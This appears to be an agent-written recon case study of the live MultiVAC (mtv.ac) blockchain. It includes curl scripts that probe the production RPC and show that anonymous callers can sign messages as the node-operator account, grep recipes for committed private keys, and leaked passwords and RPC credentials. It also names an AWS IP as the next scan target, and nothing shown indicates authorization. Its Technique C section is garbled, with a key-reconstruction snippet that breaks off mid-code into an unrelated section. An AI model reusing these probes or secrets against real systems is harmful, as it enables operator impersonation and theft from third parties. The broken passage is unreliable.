# MultiVAC (mtv.ac) Ecosystem Trust-Graph Case Study — 2026-08-17

ARCHITECT-style map of the public `mtv.ac` ecosystem. Demonstrates three operator-layer audit techniques that prior Abey/Beacon-kit/Viction/Trias sessions did not exercise: **(A) per-chain contract-address dispatch extracted from explorer JS**, **(B) `eth_coinbase` used as the role identifier for the unlocked node-operator account**, and **(C) genesis private keys committed as integer byte arrays** (different from the hex-private-key patterns already documented).

## Target surface

| Service | URL | Tech |
|---------|-----|------|
| rpc.mtv.ac | https://rpc.mtv.ac | geth v1.10.2 fork, chainId `0xf49d` (62621) |
| e.mtv.ac | https://e.mtv.ac | Vue 2.6.12 + Element UI + axios + ethers 5.2 SPA, Nginx |
| www.mtv.ac | https://www.mtv.ac | Static Vue landing on Cloudflare |
| n.mtv.ac | https://n.mtv.ac | NFT explorer (not analyzed) |
| GitHub | https://github.com/multivactech | 6 repos |

Workflow:
1. Download `e.mtv.ac/js/index.js` (86 KB webpack bundle).
2. Download every `www.mtv.ac/assets/*` + `/components/*` JS file.
3. List `multivactech` org via GitHub API, download every repo tarball (mainline `master`, since `git remote-https` is missing on TencentOS).
4. Probe `rpc.mtv.ac` live for the unlocked account.
5. Produce a single trust-graph document at `/root/mtv-recon/analysis/trust-graph-ARCHITECT.md`.

## Technique A — Per-chain contract-address dispatch in explorer JS

The minified explorer JS contains a `getContractAddress()` function that returns a different contract depending on the connected chain:

```js
chainId == this.CHAIN_ERC_20 (1)  → "0x6226e00bCAc68b0Fe55583B90A1d727C14fAB77f"   // ERC-20 MTV on Ethereum
chainId == this.CHAIN_BEP_20 (56) → "0x8aa688ab789d1848d131c65d98ceaa8875d97ef1"   // BEP-20 MTV on BNB
chainId == this.CHAIN_MTV (62621) → "0x000000007b46d81c9c1d6993aa5ff8233ceb16ee"   // native staking target
```

Plus the MetaMask `wallet_addEthereumChain` config is hardcoded as a literal array:
```
chainId: "0xf49d", chainName: "MultiVAC Mainnet", nativeCurrency: {name:"MTV",symbol:"MTV",decimals:18},
rpcUrls: ["https://rpc.mtv.ac/"], blockExplorerUrls: ["https://e.mtv.ac/"]
```

**Grep recipes that extracted this:** search the bundle for `getContractAddress`, `chainName`, `wallet_addEthereumChain`, and the ABI array (`["function name() view returns (string)", "function symbol() view returns (string)", "function balanceOf(address) view returns (uint)", "function transfer(address to, uint amount)", "event Transfer(...)"]`). The ABI pattern is the precise anchor — once it matches, scroll back ~200 chars to the `getContract()` body and follow the chain-conditional return values.

This pattern (one cross-chain-aware DApp dispatching to per-chain token contracts) is common on multi-chain桥/chains (MultiVAC, Viction, TomoChain, ABEY). Add it to Phase 1 recon: grep the explorer bundle for chain-id conditionals + ABI literals, extract the per-chain contract table, then verify each contract address on the corresponding chain (`eth_getCode` against the appropriate RPC).

## Technique B — Using `eth_coinbase` to identify the unlocked account's role

Existing pitfalls cover `eth_accounts` leaking the address (Viction). The MultiVAC case hits a strictly **stronger** condition: not only is the address exposed, but the node runs with the account fully unlocked and the `eth` namespace allows multiple wallet operations.

| Probe | Result | Meaning |
|-------|--------|---------|
| `eth_accounts` | `["0x2781bcb…"]` | One unlocked account listed |
| `eth_coinbase` | `"0x2781bcb…"` | **Designated miner/etherbase** — confirms the account is the node operator identity, not a faucet or relayer |
| `eth_sign("0xdeadbeef")` | Valid 65-byte signature | Private key loaded, signing feasible remotely |
| `eth_signTransaction` | `-32000 nonce not specified` | Method **enabled**, only blocked by missing nonce param |
| `eth_sendTransaction` | `-32000 insufficient funds` | Method **enabled**, only blocked by 0 balance — funding enables drain |
| `eth_mining` | `false` | Not actively PoW-mining |
| `eth_getBlockByNumber("latest")` | `miner=0x000…000`, `gasUsed=0`, `txs=0` | Custom PoA-style — block producer identity is hidden at EVM layer; `eth_coinbase` is the only way to identify the real operator |

**Takeaway:** always probe `eth_coinbase` in addition to `eth_accounts`. It tells you *what* the account is (operator vs. faucet vs. signing-only utility). When `eth_coinbase` returns the same address as `eth_accounts`, this is the node's block-reward recipient and operator identity — the highest-impact credential in the system. Any `eth_sign` / `eth_signTransaction` / `eth_sendTransaction` working against it is operator impersonation, not just wallet leak.

Three outputs to interpret carefully:
- `{"result":"0x0…0"}` for `eth_coinbase` — the account has been set to the null address (Clique-style "no etherbase"), OR `personal_setEtherbase` not called — typically means a different signer (BLS / Tendermint / BTC-style consensus) is the real block producer.
- `{"result":"0x2781…", "eth_mining": false}` with `miner=0x000…0` in latest blocks — node runs an EVM compatibility overlay; real blocks are produced at the sharded BTC-style layer, the EVM layer is an inert bridge view. `eth_coinbase` still leaks the operator identity.
- A separate `eth_getCode` on the `eth_coinbase` address — if it returns `0x` the account is an EOA (no further on-chain trust), if it returns bytecode it may be a contract — call its `owner()` / `admin()` getters.

## Technique C — Genesis private keys committed as integer byte arrays

MultiVAC's `model/chaincfg/genesis/generated_privatekeys.go` and `model/chaincfg/reducekey/reduceprivatekey.go` commit the genesis shard private keys as Go byte literals, not as hex strings:

```go
keys[shard.ShardList[0]] = signature.PrivateKey<redacted byte-array key material>
```

The existing skill documents `default_value` / `HexToECDSA("<redacted>")` patterns but **not** array-byte-literal private keys. Add this regex to the secret-hunt grep set:

```bash
grep -rEn 'PrivateKey\{[^}]*[0-9]+(,[0-9]+)+\s*,?\s*\}' --include='*.go' .
grep -rEn 'var\s+\w*PrivateKey\s+=.*\{' --include='*.go' .
grep -rEn '(genesis|reduce|sign|wallet)\w*[Pp]rivate[Kk]ey\s+=[^"]*[0-9]' --include='*.go' .
```

`generated_privatekeys.go` had keys for multiple shards; `reduceprivatekey.go` had a single hardcoded reduce-signing key; `testnetTools.go` had ~128 testnet private keys concatenated as hex strings (more traditional pattern, easily caught by the standard `0x[a-fA-F0-9]{64}` regex).

Once found, reconstruct the private key for verification:
```python
key_bytes = bytes([<redacted byte-array key material>,   // !!
}
```
A private-range IP committed as a public DNS seed is a network-discovery defect — the chain's mainnet bootstrap points at an unreachable IP. More importantly, it leaks the operator's internal network layout (a `192.168.*` host that probably was a real seed node at some point).

### Bootstrap seed IP committed (netTopology repo)
`netTopology/configutils/config.go`:
```go
const (
    FirstNodeIP      = "13.251.185.134"   // AWS Singapore
    FirstNodeRPCPort = 18334
)
```
A user-side recon starting point. Censys/Shodan scan `13.251.185.134` for open ports beyond `18334` (admin endpoints, pprof, etc.) is the next move.

### Monitor repo — SSH ops infra
`monitor/connect/connection.go` dials SSH with:
- `User: "root"`
- `HostKeyCallback: nil` (accepts new host key on fly — full MITM exposure)
- Password auth (no key)
`monitor/role/node_test.go` had a hardcoded test password `"ZZ@123123"`. Even if it's just a test fixture, it reveals the password style the team writes internally.

### Offline-Tools repo — weak keystore
`Offline-Tools/keystore/keystore.go` uses scrypt with:
- `N = 32768` (weaker than Ethereum V3 keystore default of 262144)
- Static salt = `"MultiVAC"` (not random per keystore)
- Result: identical password → identical KEK across every keystore on the chain; dictionary attacks parallelize trivially against many keystores at once.

Add **"static-salt scrypt keystore"** to the operator-layer audit checklist as its own class. Existing keystore weaknesses documented previously were hardcoded passwords; MultiVAC adds a third subclass where the salt is static.

## Complete probe matrix (working-curl, Lite UA)

```bash
UA="Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
RPC="https://rpc.mtv.ac"

# Identify operator identity
for M in eth_accounts eth_coinbase eth_mining eth_hashrate net_version net_peerCount; do
  printf "%-18s " "$M"; curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"$M\",\"params\":[],\"id\":1}"; echo
done

# Check if account is contract or EOA
for A in 0x2781bcbdad5c702eb9258d82ac32a94f3db95e69 \
         0x000000007b46d81c9c1d6993aa5ff8233ceb16ee \
         0x6226e00bCAc68b0Fe55583B90A1d727C14fAB77f \
         0x8aa688ab789d1848d131c65d98ceaa8875d97ef1; do
  printf "%-42s bal=" "$A"; curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getBalance\",\"params\":[\"$A\",\"latest\"],\"id\":1}"
  printf " code="; curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
    -d "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getCode\",\"params\":[\"$A\",\"latest\"],\"id\":2}"
  echo
done

# Demonstrate signing is feasible
curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"eth_sign","params":["0x2781bcbdad5c702eb9258d82ac32a94f3db95e69","0xdeadbeef"],"id":1}'

# Demonstrate send is feasible (will say "insufficient funds", which proves method is enabled)
curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"eth_sendTransaction","params":[{"from":"0x2781bcbdad5c702eb9258d82ac32a94f3db95e69","to":"0x2781bcbdad5c702eb9258d82ac32a94f3db95e69","value":"0x0","gas":"0x5208"}],"id":1}'

# Block producer pattern (should show miner=0x0 with empty gasUsed, indicating non-standard consensus)
curl -s -A "$UA" -X POST "$RPC" -H 'Content-Type: application/json' \
  -d '{"jsonrpc":"2.0","method":"eth_getBlockByNumber","params":["latest",false],"id":1}'
```

## Live verdict on 0x2781bcb…

`eth_coinbase == eth_accounts[0] == "0x2781bcb…"`. Zero balance, zero transactions, EOA. `eth_sign` returns a valid 65-byte signature on `"0xdeadbeef"` to anonymous callers. `eth_signTransaction` is enabled (returned `-32000: nonce not specified`). `eth_sendTransaction` is enabled (returned `-32000: insufficient funds for gas * price + value`). This account is the **node-operator identity** — anyone on the public internet can sign as the foundation's authorized operator. Funding this EOA would make outgoing transactions immediately broadcastable.

## Why the existing skill's `eth_accounts`-only pitfall is insufficient

The current SKILL.md pitfall for `eth_accounts` (Viction 2026-08-16) says:
> `eth_accounts` leaks wallet addresses even when `personal_*` is gated … reveals node-managed account addresses without authentication … MEDIUM info-leak.

MultiVAC is a strictly stronger case: same leak plus **signing fully enabled and verifiable live**. The classification should escalate from MEDIUM info-leak to **CRITICAL operator-impersonation capability** when any one of `eth_sign`, `eth_signTransaction`, or `eth_sendTransaction` returns anything other than `-32601 does not exist`. Train future auditors to *probe those three* after `eth_accounts`, not stop at the address leak.

## Trust boundary map

```
                            PUBLIC INTERNET
                                  │
        ┌─────────────────────────┼─────────────────────────┐
        │                         │                         │
   www.mtv.ac           ┌────────▼────────┐         ┌────────▼────────┐
   (static landing)     │  e.mtv.ac       │         │  rpc.mtv.ac     │
                       │  Vue SPA + WC   │         │  geth fork      │
                       │  (Nginx)        │         ├─────────────────┤
                       │  /block/list    │         │ eth_sign ENABLED│
                       │  /search        │◄────────┤ eth_accounts ──►│ 0x2781bcb…
                       │  /summary       │  RPC +  │ eth_coinbase ──►│ 0x2781bcb…
                       │  staking.html    │  WC +  │ eth_mining ────►│ false
                       │  bridge.html     │  MetaMask│ ─────────── CRITICAL EXPOSURE
                       │  buy.html        │  calls └─────────────────┘
                       └────────┬──────────┘
                                │  Magic ABI for ERC-20 in JS → Installs via MetaMask:
                                │  chainId 62621, RPC https://rpc.mtv.ac/, explorer https://e.mtv.ac/
                                ▼
        ┌──────────────────────────────────────────────────┐
        │ Per-chain contract dispatch (in client JS):       │
        │  MTV  (62621): 0x0000…16ee  (staking)             │
        │  ETH  (1):     0x6226…77f   (ERC-20 MTV)          │
        │  BSC  (56):    0x8aa6…ef1   (BEP-20 MTV)          │
        └──────────────────────────────────────────────────┘
                                │
                                ▼
        ┌──────────────────────────────────────────────────┐
        │ github.com/multivactech  (6 repos)                │
        │  • MultiVAC — genesis shard private keys committed │
        │  • MultiVAC — reduce-signing private key committed │
        │  • MultiVAC — rpcuser=multivac / rpcpass=multivac  │
        │  • MultiVAC — DNSSeed 192.168.200.2 (private IP)   │
        │  • netTopology — FirstNodeIP 13.251.185.134:18334  │
        │  • monitor — SSH as root, no host-key verify       │
        │  • monitor — hardcoded test password ZZ@123123     │
        │  • Offline-Tools — scrypt N=32768, salt="MultiVAC" │
        └──────────────────────────────────────────────────┘
```

## References / artifacts

- `/root/mtv-recon/js/explorer-index.js` (86 KB)
- `/root/mtv-recon/assets/www-index.html` + JS assets
- `/root/mtv-recon/repos/MultiVAC-master/` (core node source)
- `/root/mtv-recon/repos/monitor-master/` (SSH ops infra)
- `/root/mtv-recon/repos/Offline-Tools-master/` (wallet kit)
- `/root/mtv-recon/repos/netTopology-master/` (topology visualizer)
- `/root/mtv-recon/analysis/trust-graph-ARCHITECT.md` (full report)
